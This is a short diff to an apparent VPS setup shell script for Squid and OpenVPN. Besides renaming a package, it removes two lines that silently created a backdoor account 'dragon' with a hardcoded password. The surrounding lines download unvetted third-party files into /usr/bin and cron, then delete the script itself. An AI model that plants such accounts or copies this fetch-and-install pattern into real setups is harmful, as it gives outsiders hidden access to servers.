@@ -31,7 +31,7 @@ service exim4 stop;sysv-rc-conf exim4 off;
 cd
 
 # SQUID
-apt-get -y install squid
+apt-get -y install squid3
 wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/squid.conf"
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 cd
@@ -85,8 +85,6 @@ cd;wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/cronj
 tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash dragon
-echo "dragon:369" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
 rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 cd
